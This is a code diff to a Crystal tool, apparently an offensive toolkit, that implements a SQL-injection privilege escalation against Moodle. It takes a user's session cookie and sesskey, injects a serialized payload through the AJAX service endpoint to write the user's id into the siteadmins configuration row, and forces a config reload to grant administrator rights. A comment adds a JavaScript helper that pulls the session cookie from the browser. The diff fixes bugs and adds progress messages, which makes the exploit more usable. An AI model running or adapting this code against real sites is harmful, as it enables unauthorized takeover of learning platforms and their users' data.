@@ -3,6 +3,7 @@ require "http/client"
 require "option_parser"
 require "json"
 require "base64"
+require "digest"
 
 module TMoodleActions
   class SqlInjection
@@ -17,14 +18,15 @@ module TMoodleActions
     # alert("MoodleSession: " + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + "\nSessKey: " + M.cfg.sesskey + "\nUser id: " + document.querySelectorAll('[data-userid]')[0].getAttribute("data-userid"))
     # Or paste it into the Dev Tools console.
     def perform(url)
-      puts "Enter MoodleSession. Use helper command if needed."
+      puts "Enter your MoodleSession. Use helper command if needed."
       moodle_session = gets().not_nil!
       puts "Enter session key"
       sess_key = gets().not_nil!
       puts "Enter your user id"
-      user_id = gets().not_nil!
-      puts "Elevating your privileges"
-      execute(url, moodle_session, sess_key, value = user_id)
+      user_id = gets().not_nil!.to_i
+      puts "Executing attack..."
+      execute(url, moodle_session, sess_key, value: user_id)
+      puts "You should now be an administrator."
     end
 
     def execute(url, moodle_session, sess_key, table = "config", row_id = 25, column = "value", value = 3)
@@ -33,38 +35,39 @@ module TMoodleActions
       # column = "value" # column name to update, which holds the userid
       # value = 3        # userid to set as "siteadmins" Probably want to make it your own
 
+      puts "Setting configuration payload..."
       update_table(url, moodle_session, sess_key, table, row_id, column, value)
 
       row_id = 375 # row id of "allversionshash" parameter
       # reset the allversionshash config entry with a sha1 hash so the site reloads its configuration
       sha_hash = Digest::SHA1.hexdigest(Time.utc_now.to_unix.to_s)
+      puts "Resetting config hash to trigger configuration reload..."
       update_table(url, moodle_session, sess_key, table, row_id, column, sha_hash)
 
       # reset the sortorder so we can see the front page again without the payload triggering
       data = {"sesskey" => sess_key, "sortorder[]" => 1}
+      puts "Resetting sort order to prevent retriggering payload..."
       http_post(url + "/blocks/course_overview/save.php", data, moodle_session, 0)
 
       # force plugincheck so we can access admin panel
+      puts "Activating admin panel..."
       http_get(url + "/admin/index.php?cache=0&confirmplugincheck=1", moodle_session)
     end
 
-    private def http_post(url, data, moodle_session, json : Boolean)
+    private def http_post(url, data : String | Hash(String, String | Int32), moodle_session, json)
       headers = HTTP::Headers.new
       headers.add("Cookie", "MoodleSession=" + moodle_session)
       if json
         headers.add("Content-Type", "application/json")
-      else
-        data = HTTP::Params.encode(data)
       end
 
-      # post
-      return HTTP::Client.post(url, headers: headers, body: data).body
+      return HTTP::Client.post(url, headers: headers, body: data.to_s)
     end
 
     private def http_get(url, moodle_session)
       headers = HTTP::Headers.new
       headers.add("Cookie", "MoodleSession=" + moodle_session)
-      return HTTP::Client.get(url, headers: headers).body
+      return HTTP::Client.get(url, headers: headers)
     end
 
     private def update_table(url, moodle_session, sess_key, table, row_id, column, value)
@@ -87,11 +90,13 @@ module TMoodleActions
               "i:0;s:#{column_name_length}:\"#{column}\";i:1;s:2:\"id\";}}}}};"
 
       #   we"ll set the course_blocks sortorder to 0 so we default to legacy user preference
-      data = {"sesskey" => sess_key, "sortorder[]" => 0}
+      data = {"sesskey" => sess_key, "sortorder[]" => "0"}
+      puts "Setting course_blocks sortorder..."
       http_post(url + "/blocks/course_overview/save.php", data, moodle_session, false)
+
       #    injecting the payload
 
-      # be hold the most beautiful json builder. can be parsed by regex (end)*
+      # behold the most beautiful json builder. can be parsed by regex (end)*
       string = JSON.build do |json|
         json.array do
           json.object do
@@ -114,9 +119,11 @@ module TMoodleActions
       end
 
       #     httpPost($url..$sesskey, $data, $MoodleSession,1);
-      http_post("#{url}/lib/ajax/service.php?sesskey=#{sess_key}", data, moodle_session, true)
+      puts "Injecting payload..."
+      http_post("#{url}/lib/ajax/service.php?sesskey=#{sess_key}", string, moodle_session, true)
 
       #     getting the frontpage so the payload will activate
+      puts "Activating payload"
       http_get(url + "/my/", moodle_session)
     end
   end
